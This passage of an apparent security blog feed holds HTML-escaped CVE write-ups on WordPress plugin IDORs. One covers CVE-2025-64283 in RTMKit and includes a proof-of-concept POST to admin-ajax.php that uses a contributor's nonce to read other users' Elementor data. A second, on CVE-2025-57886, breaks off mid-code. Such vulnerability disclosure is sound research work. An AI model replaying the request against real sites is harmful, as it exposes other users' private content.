id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers the following action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_get_template_content&amp;#39;, [$this, &amp;#39;get_template_content&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In WordPress, the &lt;code&gt;wp_ajax_&lt;/code&gt; prefix is used to handle AJAX requests sent to &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; from &lt;strong&gt;authenticated users&lt;/strong&gt;. When a request includes the parameter &lt;code&gt;action=get_template_content&lt;/code&gt;, WordPress invokes the corresponding &lt;code&gt;get_template_content&lt;/code&gt; function to process and return data.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function get_template_content()&#xA;{&#xA;    if (!isset($_POST[&amp;#39;wpnonce&amp;#39;]) ||  ! check_ajax_referer(&amp;#39;rtm_template_nonce&amp;#39;, &amp;#39;wpnonce&amp;#39;)) {&#xA;        wp_send_json_error(&amp;#39;Access Denied&amp;#39;);&#xA;        wp_die();&#xA;    }&#xA;&#xA;    $id = absint($_POST[&amp;#39;template&amp;#39;]);&#xA;&#xA;    $elementorData = get_post_meta($id, &amp;#39;_elementor_data&amp;#39;, true);&#xA;&#xA;    $data = [&amp;#39;content&amp;#39; =&amp;gt; json_decode($elementorData)];&#xA;&#xA;    wp_send_json_success($data);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;get_template_content&lt;/code&gt; function processes the AJAX request as follows:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Checks the existence of &lt;code&gt;wpnonce&lt;/code&gt; and validates it using &lt;code&gt;check_ajax_referer&lt;/code&gt; to ensure request legitimacy and CSRF protection.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;Tip&lt;/p&gt;&lt;p&gt;When searching for the keyword &lt;code&gt;rtm_template_nonce&lt;/code&gt;&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; title=&#34;How the nonce is created&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/create_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;How the nonce is created&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/create_nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;239&#34; width=&#34;1197&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;How the nonce is created&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&#xA;The nonce is generated using &lt;code&gt;wp_create_nonce(&#39;rtm_template_nonce&#39;)&lt;/code&gt; and attached to the JavaScript object &lt;code&gt;rkit_libs&lt;/code&gt; via &lt;code&gt;wp_localize_script&lt;/code&gt; with the storage key &lt;code&gt;template_nonce&lt;/code&gt;. The client uses this value and sends it back in the AJAX request as the &lt;code&gt;wpnonce&lt;/code&gt; parameter for validation.&#xA;When filtering requests in BurpSuite using the keyword &lt;code&gt;rkit_libs&lt;/code&gt;, this value can be observed.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#34; title=&#34;Nonce value&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce value&lt;/h2&gt;&lt;p&gt;Nonce value&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/nonce.png&#39; alt=&#34;Nonce value&#34; height=&#34;328&#34; width=&#34;1537&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce value&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Retrieves the &lt;code&gt;template&lt;/code&gt; parameter from &lt;code&gt;POST&lt;/code&gt; and casts it to an integer using &lt;code&gt;absint&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Fetches the &lt;code&gt;_elementor_data&lt;/code&gt; meta value associated with the post ID via &lt;code&gt;get_post_meta&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Decodes the JSON data and wraps it in a response array.&lt;/li&gt;&#xA;&lt;li&gt;Returns the data via a successful JSON response (&lt;code&gt;wp_send_json_success&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;The vulnerability arises because &lt;code&gt;$id&lt;/code&gt; is not properly access-controlled, allowing &lt;strong&gt;Contributor+&lt;/strong&gt; users to retrieve arbitrary post data belonging to other users.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch v1.6.8&lt;/strong&gt; introduces an additional user capability check using &lt;code&gt;current_user_can(&#39;manage_options&#39;)&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (!current_user_can(&amp;#39;manage_options&amp;#39;)) {&#xA;    wp_send_json_error(&amp;#39;Access Denied: Insufficient permissions&amp;#39;);&#xA;    wp_die();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This ensures that only users with &lt;strong&gt;Administrator&lt;/strong&gt; privileges can proceed. Unauthorized users receive an &lt;code&gt;Access Denied: Insufficient permissions&lt;/code&gt; response.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Contributor&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST request to admin-ajax.php&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;action=get_template_content&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;get_template_content() executed&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;check_ajax_referer passed&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;Control template ID parameter&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;get_post_meta(target_id, _elementor_data)&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;Return template content&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Create a post using &lt;strong&gt;Elementor&lt;/strong&gt; with a &lt;strong&gt;Contributor+ user&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Capture the request using BurpSuite and extract the returned nonce value:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;script id=&amp;#34;rkit-library-script-js-extra&amp;#34;&amp;gt;&#xA;    var rkit_libs = {&amp;#34;logo_url&amp;#34;:&amp;#34;http://localhost/wp-content/plugins/rometheme-for-elementor//view/images/RTMKitNew.png&amp;#34;,&amp;#34;ajax_url&amp;#34;:&amp;#34;http://localhost/wp-admin/admin-ajax.php&amp;#34;,&amp;#34;template_nonce&amp;#34;:&amp;#34;nonce_value&amp;#34;};&#xA;    //# sourceURL=rkit-library-script-js-extra&#xA;&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Send a request with &lt;code&gt;template=id_of_other_post&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: contributor_cookie&#xA;&#xA;action=get_template_content&amp;amp;wpnonce=bea52715a7&amp;amp;template=25&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result:&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; title=&#34;Administrator post content&#34; data-thumbnail=&#34;/posts/2025-12-24-cve-2025-64283/admin_post.png&#34; data-sub-html=&#34;&lt;h2&gt;Administrator post&lt;/h2&gt;&lt;p&gt;Administrator post content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-24-cve-2025-64283/admin_post.png&#39; alt=&#34;Administrator post&#34; height=&#34;799&#34; width=&#34;1412&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Administrator post content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Other AJAX actions affected by the same issue&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_lib&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_fetch_envato_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_template&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_get_installed_templates&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;wp_ajax_template_category&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-64283 stems from the plugin relying solely on &lt;strong&gt;nonce validation&lt;/strong&gt; for AJAX request authentication without enforcing &lt;strong&gt;role-based authorization checks&lt;/strong&gt;. This allows lower-privileged users (Contributor+) to control the &lt;code&gt;template&lt;/code&gt; parameter and access &lt;code&gt;_elementor_data&lt;/code&gt; of posts they do not own. Version 1.6.8 mitigates the issue by introducing a proper administrator-level capability check.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Nonces &lt;strong&gt;do not replace&lt;/strong&gt; authorization controls.&lt;/li&gt;&#xA;&lt;li&gt;WordPress AJAX actions must &lt;strong&gt;validate appropriate user capabilities&lt;/strong&gt;, not just authentication.&lt;/li&gt;&#xA;&lt;li&gt;User-controlled object identifiers (IDs) must be &lt;strong&gt;strictly bound to access permissions&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;IDOR vulnerabilities commonly arise from improperly enforced access control in AJAX logic.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/rometheme-for-elementor/vulnerability/wordpress-rtmkit-plugin-1-6-7-insecure-direct-object-references-idor-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin &amp;lt;= 1.6.7 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-57886 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-22-cve-2025-57886/</link>
      <pubDate>Mon, 22 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-22-cve-2025-57886/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-22-cve-2025-57886/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Authorization Bypass via User-Controlled Key&lt;/strong&gt; vulnerability in the &lt;strong&gt;Equalize Digital Accessibility Checker&lt;/strong&gt; plugin by &lt;strong&gt;Equalize Digital&lt;/strong&gt; allows exploitation of &lt;strong&gt;misconfigured access control levels&lt;/strong&gt;. This vulnerability affects &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt; from an &lt;strong&gt;unspecified&lt;/strong&gt; version up to &lt;strong&gt;1.30.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-57886&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-57886&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.30.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.30.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/accessibility-checker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Accessibility Checker by Equalize Digital Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Accessibility Checker by Equalize Digital&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.30.0&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt; * &lt;code&gt;1.30.1&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registered a REST API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function init_rest_routes() {&#xA;    $ns      = &amp;#39;accessibility-checker/&amp;#39;;&#xA;    $version = &amp;#39;v1&amp;#39;;&#xA;&#xA;    add_action(&#xA;        &amp;#39;rest_api_init&amp;#39;,&#xA;        function () use ( $ns, $version ) 